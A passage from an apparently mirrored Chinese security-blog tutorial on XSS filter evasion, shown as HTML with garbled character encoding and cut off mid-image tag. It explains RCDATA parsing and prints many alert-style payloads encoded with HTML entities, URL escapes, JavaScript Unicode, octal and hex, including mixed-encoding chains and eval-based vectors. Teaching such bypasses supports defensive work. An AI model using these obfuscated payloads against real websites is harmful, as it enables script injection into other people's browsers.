class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><p>åŒæ ·ä¹Ÿæ˜¯ä¸ä¼šè§¦å‘XSSçš„</p><p>è¿™æ¶‰åŠåˆ°äº†RCDATAçš„ä¸€ä¸ªç‰¹æ®Šçš„æƒ…å†µã€‚å³åœ¨æµè§ˆå™¨è§£æRCDATAå…ƒç´ çš„è¿‡ç¨‹ä¸­ï¼Œè§£æå™¨ä¼šè¿›å…¥â€œRCDATAçŠ¶æ€â€ã€‚åœ¨è¿™ä¸ªçŠ¶æ€ä¸­ï¼Œå¦‚æœé‡åˆ°â€œ&lt;â€å­—ç¬¦ï¼Œå®ƒä¼šè½¬æ¢åˆ°â€œRCDATAå°äºå·çŠ¶æ€â€ã€‚å¦‚æœâ€œ&lt;â€å­—ç¬¦åæ²¡æœ‰ç´§è·Ÿç€â€œ&#x2F;â€å’Œå¯¹åº”çš„æ ‡ç­¾åï¼Œè§£æå™¨ä¼šè½¬æ¢å›â€œRCDATAçŠ¶æ€â€ï¼Œå¹¶ä¸ä¼šè¿›å…¥â€œæ ‡ç­¾å¼€å§‹çŠ¶æ€â€çš„ã€‚è¿™æ„å‘³ç€åœ¨RCDATAå…ƒç´ æ ‡ç­¾çš„å†…å®¹ä¸­ï¼Œå”¯ä¸€èƒ½å¤Ÿè¢«è§£æå™¨è®¤åšæ˜¯æ ‡ç­¾çš„å°±åªæœ‰ <code>&lt;/textarea&gt;</code> æˆ–è€… <code>&lt;/title&gt;</code>ï¼Œå› æ­¤ï¼Œåœ¨ <code>&lt;textarea&gt;</code> å’Œ <code>&lt;title&gt;</code> çš„å†…å®¹ä¸­ä¸ä¼šåˆ›å»ºæ ‡ç­¾ï¼Œå°±ä¸ä¼šæœ‰è„šæœ¬èƒ½å¤Ÿæ‰§è¡Œäº†ã€‚</p><p>å¦å¤–è¿˜æœ‰ä¸€ç‚¹è¦æ³¨æ„ï¼šæˆ‘ä»¬ä»ä¸Šé¢HTMLçš„äº”ç±»å…ƒç´ ä¸­è¿˜å‘ç°æœ‰ä¸€ä¸ªåŸå§‹æ–‡æœ¬å…ƒç´  <code>&lt;script&gt;</code> åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚æµè§ˆå™¨çœ‹ä¸æ‡‚ä¸­é—´è¿™å †ç¼–ç æ˜¯å’Œå•¥ä¸œè¥¿ï¼Œæ‰€ä»¥ä¹Ÿä¸ä¼šè¢«æ‰§è¡Œï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/../images/20210523094714-cc1f779a-bb68-1.png" alt="img"></p><p>é‚£ä¹ˆå¦‚ä½•æ‰èƒ½è®©é‡Œé¢çš„å†…å®¹è¿›è¡Œè½¬ä¹‰å¹¶æ‰§è¡Œå¼¹çª—å‘¢ï¼Œè¿™é‡Œéœ€è¦åˆ©ç”¨åˆ°XSSçš„ä¸€ä¸ªé»‘é­”æ³•â€”â€”â€œsvgâ€ï¼Œæˆ‘ä»¬ä¸‹æ–‡ä¸­ä¼šæåŠã€‚</p><h2 id="URLç¼–ç "><a href="#URLç¼–ç " class="headerlink" title="URLç¼–ç "></a>URLç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å¹¶å°†srcæˆ–hrefå±æ€§ä¸­çš„å†…å®¹è¿›è¡ŒURLç¼–ç ï¼Œå½“HTMLè§£æå™¨å¯¹srcæˆ–hrefä¸­çš„å­—ç¬¦å®ŒæˆHTMLè§£ç åï¼Œæ¥ä¸‹æ¥URLè§£æå™¨ä¼šå¯¹srcæˆ–hrefä¸­çš„å€¼è¿›è¡ŒURLè§£ç ã€‚</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;...&quot;</span>&gt;</span>xx<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;...&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä¸‹é¢ç»™å‡ºå‡ ä¸ªå®ä¾‹ã€‚</p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%61%6c%65%72%74%28%22%78%73%73%22%29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;iframe src=javascript:alert(&quot;xss&quot;)&gt;&lt;/iframe&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;javascript:%61%6c%65%72%74%28%22%78%73%73%22%29&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ³¨æ„ï¼Œä¼ªåè®®å¤´ <code>javascript:</code> æ˜¯ä¸èƒ½è¿›è¡Œç¼–ç çš„ã€‚è¿™é‡Œå°±æœ‰ä¸€ä¸ªURLè§£æè¿‡ç¨‹ä¸­çš„ä¸€ä¸ªç»†èŠ‚äº†ï¼Œå³ä¸èƒ½å¯¹åè®®ç±»å‹è¿›è¡Œä»»ä½•çš„ç¼–ç æ“ä½œï¼Œå¦åˆ™URLè§£æå™¨ä¼šè®¤ä¸ºå®ƒæ— ç±»å‹ï¼Œå°±ä¼šå¯¼è‡´DOMèŠ‚ç‚¹ä¸­è¢«ç¼–ç çš„â€œjavascriptâ€æ²¡æœ‰è¢«è§£ç ï¼Œå½“ç„¶ä¸ä¼šè¢«URLè§£æå™¨è¯†åˆ«äº†ã€‚å°±æ¯”å¦‚è¯´ <code>http://www.baidu.com</code> å¯ä»¥è¢«URLç¼–ç ä¸º <code>http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code>ï¼Œä½†æ˜¯ä¸èƒ½æŠŠåè®®ä¹Ÿè¿›URLç¼–ç ï¼š<code>%68%74%74%70%3a%2f%2f%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d</code> ã€‚</p><p>ä½†æ˜¯ä¼ªåè®®å¤´ <code>javascript:</code> å¯ä»¥è¿›è¡ŒHTMLç¼–ç ã€‚</p><h2 id="Javascript-ç¼–ç "><a href="#Javascript-ç¼–ç " class="headerlink" title="Javascript ç¼–ç "></a>Javascript ç¼–ç </h2><p>æˆ‘ä»¬å¯ä»¥å°†DOMèŠ‚ç‚¹ä¸­çš„å†…å®¹è½¬åŒ–ä¸º Javascript ç¼–ç ã€‚å½“HTMLè§£æäº§ç”ŸDOMèŠ‚ç‚¹åï¼Œä¼šæ ¹æ®DOMèŠ‚ç‚¹æ¥åšæ¥ä¸‹æ¥çš„è§£æå·¥ä½œï¼Œæ¯”å¦‚åœ¨å¤„ç†è¯¸å¦‚ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„æ ‡ç­¾æ—¶ï¼Œè§£æå™¨ä¼šè‡ªåŠ¨åˆ‡æ¢åˆ°JavaScriptè§£ææ¨¡å¼ï¼Œè€Œ <code>src</code>ã€ <code>href</code> åè¾¹åŠ å…¥çš„ javascript ä¼ªURLï¼Œä¹Ÿä¼šè¿›å…¥ JavaScript çš„è§£ææ¨¡å¼ã€‚</p><p>Javascript ä¸­å¯ä»¥è¯†åˆ«çš„ç¼–ç ç±»å‹æœ‰ï¼š</p><ul><li>Unicode ç¼–ç </li><li>å…«è¿›åˆ¶ç¼–ç </li><li>åå…­è¿›åˆ¶ç¼–ç </li></ul><p>ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä½¿ç”¨Unicodeç¼–ç çš„æ¯”è¾ƒå¹¿æ³›ï¼Œè€Œå…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶åªæœ‰åœ¨DOMç¯å¢ƒæˆ–eval()ç­‰å‡½æ•°ä¸­æ‰å¯ä»¥ç”¨ã€‚</p><h3 id="Unicode-ç¼–ç "><a href="#Unicode-ç¼–ç " class="headerlink" title="Unicode ç¼–ç "></a>Unicode ç¼–ç </h3><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006C\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\u0061\u006C\u0065\u0072\<span class="title function_">u0074</span>(<span class="string">&quot;\u0078\u0073\u0073&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;\<span class="attr">u0078</span>\<span class="attr">u0073</span>\<span class="attr">u0073</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä½†è¦æ³¨æ„ï¼Œæˆ‘ä»¬åŒæ ·ä¹Ÿä¸èƒ½å¯¹ä¼ªåè®®å¤´ <code>javascript:</code> è¿›è¡Œ Javascript ç¼–ç ã€‚å¹¶ä¸”åƒåœ†æ‹¬å·ã€åŒå¼•å·ã€å•å¼•å·è¿™æ ·çš„ç¬¦å·æˆ‘ä»¬ä¹Ÿä¸èƒ½è¿› Javascript ç¼–ç ï¼Œä½†æ˜¯èƒ½è¿›è¡ŒHTMLç¼–ç ã€‚</p><h3 id="åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç "><a href="#åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç " class="headerlink" title="åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç "></a>åœ¨DOMç¯å¢ƒä¸­çš„JavaScriptç¼–ç </h3><p>å¯¹äºå…«è¿›åˆ¶ç¼–ç å’Œåå…­è¿›åˆ¶ç¼–ç ï¼Œä¸ Unicode ç¼–ç è¿˜æ˜¯æœ‰åŒºåˆ«ï¼Œåƒä¸‹é¢çš„XSSå‘é‡æ˜¯ä¸èƒ½ç›´æ¥æ‰§è¡Œçš„ï¼š</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">\<span class="number">141</span>\<span class="number">154</span>\<span class="number">145</span>\<span class="number">162</span>\<span class="number">164</span>(<span class="string">&quot;xss&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\x61\x6c\x65\x72\x74(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å¦‚ä¸‹å›¾ï¼Œæ’å…¥ä¹‹åæ²¡æœ‰ä»»ä½•ååº”ï¼š</p><p>[<img src="/../images/20210523094714-cc651728-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094714-cc651728-bb68-1.png)</p><p>[<img src="/../images/20210523094714-cca61c3c-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094714-cca61c3c-bb68-1.png)</p><p>è¦æƒ³è®©ä»–ä»¬èƒ½å¤Ÿæ‰§è¡Œæˆ‘ä»¬è¦å°†ä»–ä»¬æ”¾åœ¨DOMç¯å¢ƒä¸­ï¼Œå³DOMå‹çš„XSSã€‚</p><p>æµ‹è¯•ä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;s&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> search = <span class="string">&quot;...&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;s&#x27;</span>).<span class="property">innerHTML</span> = search;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ä»¥ä¸Šæƒ…å†µå¾ˆå¤šéƒ½æ˜¯å‡ºç°åœ¨ä½ æœç´¢åï¼Œæ˜¾ç¤ºä½ æ‰€æŸ¥è¯¢çš„å…³é”®å­—ï¼Œå˜é‡ <code>search</code> æ˜¯ä¸€ä¸ªå¯æ§ç‚¹ï¼Œå½“æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸ªXSSæ”»å‡»å‘é‡åï¼Œå˜é‡ <code>search</code> å°±ä¼šè¢«èµ‹å€¼ä¸ºè¿™ä¸ªXSSå‘é‡ï¼Œä»è€Œæ’å…¥åˆ°divæ ‡ç­¾ä¸­è§¦å‘XSSï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&#x27;s&#x27;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> search = <span class="string">&quot;&lt;iframe src=javascript:alert(&#x27;xss&#x27;)&gt;&lt;/iframe&gt;&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;s&#x27;</span>).<span class="property">innerHTML</span> = search;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>[<img src="/../images/20210523094715-cce8331a-bb68-1.png" alt="img">](.&#x2F;è°­è°ˆ XSS é‚£äº›ä¸–äººçš†çŸ¥çš„äº‹ - å…ˆçŸ¥ç¤¾åŒº_files&#x2F;20210523094715-cce8331a-bb68-1.png)</p><p>æ­¤æ—¶å¦‚æœè¿‡æ»¤äº† <code>&lt;</code>ã€<code>&gt;</code>ã€<code>&#39;</code>ã€<code>&quot;</code>ã€<code>&amp;</code>ã€<code>%</code> ç­‰ç­‰è¿™äº›å­—ç¬¦çš„è¯ï¼Œæˆ‘ä»¬ä¾¿å¯ä»¥ç”¨JavaScriptç¼–ç çš„æ–¹æ³•å°†XSSå‘é‡å…¨éƒ¨ç¼–ç ï¼Œå³ <code>&lt;iframe src=javascript:alert(&#39;xss&#39;)&gt;&lt;/iframe&gt;</code> çš„ä»¥ä¸‹ç¼–ç éƒ½å¯ä»¥å¼¹çª—ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// Unicodeç¼–ç </span><br><span class="line">\u003C\u0069\u0066\u0072\u0061\u006D\u0065\u0020\u0073\u0072\u0063\u003D\u006A\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003A\u0061\u006C\u0065\u0072\u0074\u0028\u0027\u0078\u0073\u0073\u0027\u0029\u003E\u003C\u002F\u0069\u0066\u0072\u0061\u006D\u0065\u003E</span><br><span class="line"></span><br><span class="line">// å…«è¿›åˆ¶ç¼–ç </span><br><span class="line">\74\151\146\162\141\155\145\40\163\162\143\75\152\141\166\141\163\143\162\151\160\164\72\141\154\145\162\164\50\47\170\163\163\47\51\76\74\57\151\146\162\141\155\145\76</span><br><span class="line"></span><br><span class="line">// åå…­è¿›åˆ¶ç¼–ç </span><br><span class="line">\x3c\x69\x66\x72\x61\x6d\x65\x20\x73\x72\x63\x3d\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3a\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29\x3e\x3c\x2f\x69\x66\x72\x61\x6d\x65\x3e</span><br></pre></td></tr></table></figure><p>è¿˜æœ‰ä¸€ç§è®©å…«è¿›åˆ¶å’Œåå…­è¿›åˆ¶ç¼–ç çš„XSSæ”»å‡»å‘é‡æ‰§è¡Œçš„æ–¹å¼ä¾¿æ˜¯å°†XSSå‘é‡æ”¾åœ¨æŸä¸ªèƒ½æŠŠå­—ç¬¦ä¸²å½“åšJavaScriptä»£ç æ¥æ‰§è¡Œçš„å‡½æ•°é‡Œï¼Œæ¯”å¦‚eval()ã€setTimeout()ã€setInterval()ç­‰å‡½æ•°ã€‚å¦‚ä¸‹ç¤ºä¾‹ï¼š</p><ul><li><code>&lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="built_in">eval</span>(<span class="string">&quot;\141\154\145\162\164\50\42\170\163\163\42\51&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:eval(</span>&quot;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x22</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x22</span>\<span class="attr">x29</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><ul><li><code>&lt;img src=x onerror=alert(&quot;xss&quot;)&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">eval(</span>&#x27;\<span class="attr">x61</span>\<span class="attr">x6c</span>\<span class="attr">x65</span>\<span class="attr">x72</span>\<span class="attr">x74</span>\<span class="attr">x28</span>\<span class="attr">x27</span>\<span class="attr">x78</span>\<span class="attr">x73</span>\<span class="attr">x73</span>\<span class="attr">x27</span>\<span class="attr">x29</span>&#x27;)&gt;</span></span><br></pre></td></tr></table></figure><p>æˆ–è€…ä¹Ÿå¯ä»¥ç›´æ¥å°†ä¸€æ•´æ®µjsä»£ç ç¼–ç åæ”¾å…¥eval()å‡½æ•°ä¸­æ‰§è¡Œã€‚</p><h2 id="æ··åˆç¼–ç "><a href="#æ··åˆç¼–ç " class="headerlink" title="æ··åˆç¼–ç "></a>æ··åˆç¼–ç </h2><p><strong>æ··åˆç¼–ç å°±æ˜¯å¯¹ä¸€ä¸ªXSSå‘é‡åŒæ—¶è¿›è¡Œå¤šç§ç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">// å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alert(&quot;xss&quot;)è¿›è¡ŒURLç¼–ç </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;%61%6c%65%72%74%28%22%78%73%73%22%29</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// å¯¹javascript:è¿›è¡ŒHTMLç¼–ç , å¯¹alertè¿›è¡ŒUnicodeç¼–ç </span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>ä¹Ÿå¯ä»¥åˆ©ç”¨è§£ç é¡ºåºè¿›è¡Œæ··åˆç¼–ç ï¼Œå¦‚ä¸‹ç¤ºä¾‹ï¼š</strong></p><ul><li><code>&lt;a href=javascript:alert(&quot;xss&quot;)&gt;test&lt;/a&gt;</code></li></ul><p>é¦–å…ˆå¯¹â€œalertâ€è¿›è¡ŒJavaScript Unicodeç¼–ç ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:\u0061\u006C\u0065\u0072\u0074(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç„¶åå†å¯¹ <code>\u0061\u006c\u0065\u0072\u0074</code> è¿›è¡ŒURLç¼–ç ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(</span>&quot;<span class="attr">xss</span>&quot;)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æœ€åå¯¹æ ‡ç­¾ä¸­çš„ <code>javascript:%5c%75...%37%34(&quot;xss&quot;)</code> æ•´ä½“è¿›è¡ŒHTMLç¼–ç å³å¯ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x22;&amp;#x78;&amp;#x73;&amp;#x73;&amp;#x22;&amp;#x29;</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•"><a href="#SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•" class="headerlink" title="SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•"></a>SVGï¼šXSSçš„ä¸€ä¸ªé»‘é­”æ³•</h2><p>æˆ‘ä»¬åœ¨ä¸Šæ–‡HTMLç¼–ç é‚£é‡Œæœ€åç•™äº†ä¸€ä¸ªå‘ï¼Œå³HTMLçš„äº”ç±»å…ƒç´ ä¸­ï¼Œåƒ <code>&lt;script&gt;</code>ã€<code>&lt;style&gt;</code> è¿™æ ·çš„åŸå§‹æ–‡æœ¬å…ƒç´ åœ¨è¿™ä¸ªæ ‡ç­¾å†…å®¹çº³çš„æ˜¯æ–‡æœ¬ï¼Œæ‰€ä»¥æµè§ˆå™¨åœ¨è§£æåˆ°è¿™ä¸ªæ ‡ç­¾åï¼Œé‡Œé¢å†…å®¹ä¸­çš„HTMLç¼–ç å¹¶ä¸ä¼šè¢«è®¤ä¸ºæ˜¯HTMLå®ä½“å¼•ç”¨ï¼Œæ‰€ä»¥å¹¶ä¸ä¼šè¢«è§£ç ä¸ºç›¸åº”çš„å­—ç¬¦ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œå‘ä¸‹é¢è¿™æ ·çš„ä»£ç ï¼Œæµè§ˆå™¨ä¸ä¼šå¯¹å…¶ä¸­çš„HTMLå®ä½“å­—ç¬¦è¿›è¡Œè§£ç ï¼Œä¹Ÿå°±ä¸ä¼šæ‰§è¡Œå¹¶è§¦å‘XSSäº†ï¼š</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"><span class="symbol">&amp;#97;</span><span class="symbol">&amp;#108;</span><span class="symbol">&amp;#101;</span><span class="symbol">&amp;#114;</span><span class="symbol">&amp;#116;</span><span class="symbol">&amp;#40;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#120;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#115;</span><span class="symbol">&amp;#34;</span><span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1)</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">alert<span class="symbol">&amp;#40;</span>1<span class="symbol">&amp;#41;</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>é‚£å¦‚ä½•ç»•è¿‡HTMLåŸå§‹æ–‡æœ¬å…ƒç´ è¿›è€Œæ‰§è¡ŒHTMLå®ä½“è§£ç å‘¢ï¼Œè¿™æ¶‰åŠåˆ°äº† <code>&lt;svg&gt;</code> çš„é­”åŠ›ï¼Œé‚£æ˜¯ä¸€ç§ç‰¹æ®Šçš„è§¦å‘æ•ˆæœï¼Œå•çº¯scriptæ ‡ç­¾å†…åŠ è½½htmlå®ä½“ç¼–ç ï¼Œåªä¼šå½“åšæ–‡æœ¬ï¼Œæ²¡æœ‰ä»»ä½•è§¦å‘ç»“æœï¼Œå¦‚ä¸‹å›¾ï¼š</p><p>[<img src="/../images/20210523094715-cd264a4c-bb68-1.png" 